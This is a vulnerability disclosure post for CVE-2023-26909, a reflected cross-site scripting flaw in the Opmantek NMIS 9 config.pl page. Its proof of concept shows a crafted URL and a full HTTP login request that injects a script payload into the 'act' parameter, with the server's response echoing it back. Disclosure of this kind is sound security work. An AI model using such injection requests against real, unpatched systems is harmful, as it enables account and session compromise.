---
layout: post
title:  "Cross-site scripting (XSS) in Opmantek NMIS module before 9.4.3"
date:   2023-04-06 19:51:02 +0700 
categories: [cve]
---

* CVE ID: CVE-2023-26909
* CWE ID: CWE-79

#### Vendor: Opmantek (FirstWave company)

#### Product: Opmantek NMIS9 Virtual Appliance

#### Version affected: NMIS 9.4.2 and earlier versions

#### Product description:

FirstWave is a publicly-listed, global technology company formed in 2004 in Sydney, Australia.
FirstWave’s globally unique CyberCision platform provides best-in-class cybersecurity technologies, enabling FirstWave’s Partners, including some of the world’s largest telcos and managed service providers (MSPs), to protect their customers from cyber-attacks, while rapidly growing cybersecurity services revenues at scale.

#### Proof of Concept:

Reflected cross-site scripting (XSS) vulnerability was discovered in the product.

A cross-site scripting vulnerability was identified on the cgi-bin/config.pl page.

The following Proof of Concept (PoC) demonstrates the attack as well as displaying evidence of the script payload being returned in the response. 

#### Request:
{% highlight ruby %}

Reproducing of Cross-Site scripting

1.GET Request

https://1.2.3.4/cgi-nmis9/config.pl?act=%3Cscript%3Ealert(1)%3C/script%3E&section=system&item=hide_groups

2. User admin/password in this case getting logged on, when injected java script gets executed.

3. Final HTTP Request/Response

Request:

POST /cgi-nmis9/config.pl HTTP/1.1
Host: 1.2.3.4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------219772600018532218693195954924
Content-Length: 1030
Origin: https://1.2.3.4
Referer: https://1.2.3.4/cgi-nmis9/config.pl
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------219772600018532218693195954924
Content-Disposition: form-data; name="auth_username"

admin
-----------------------------219772600018532218693195954924
Content-Disposition: form-data; name="auth_password"

password
-----------------------------219772600018532218693195954924
Content-Disposition: form-data; name="login"

Login
-----------------------------219772600018532218693195954924
Content-Disposition: form-data; name="conf"


-----------------------------219772600018532218693195954924
Content-Disposition: form-data; name="login"

Login
-----------------------------219772600018532218693195954924
Content-Disposition: form-data; name="act"

<script>alert(1)</script>
-----------------------------219772600018532218693195954924
Content-Disposition: form-data; name="section"

system
-----------------------------219772600018532218693195954924
Content-Disposition: form-data; name="item"

hide_groups
-----------------------------219772600018532218693195954924--


Response:

HTTP/1.1 200 OK
Date: Wed, 04 Jan 2023 07:07:13 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
Expires: Wed, 04 Jan 2023 07:07:15 GMT
Set-Cookie: omk=eyJhdXRoX2RhdGEiOiJhZG1pbiIsImV4cGlyZXMiOjE2NzI4MTc4MzV9--a1cfd6a852976485aaba2df83a25208834899b73; path=/; expires=Wed, 04-Jan-2023 07:37:15 GMT; HttpOnly
Connection: close
Content-Type: text/html; charset=ISO-8859-1
Content-Length: 77

Config: ERROR, act=<script>alert(1)</script>, node=, intf=
Request not found

{% endhighlight %}

#### References:
1. https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
2. https://firstwave.com/products/network-management-information-system/
3. https://support.opmantek.com/browse/SUPPORT-10209
4. https://community.opmantek.com/display/NMIS/NMIS+9+Release+Notes
5. https://dl-nmis.opmantek.com/nmis9-9.4.3.run
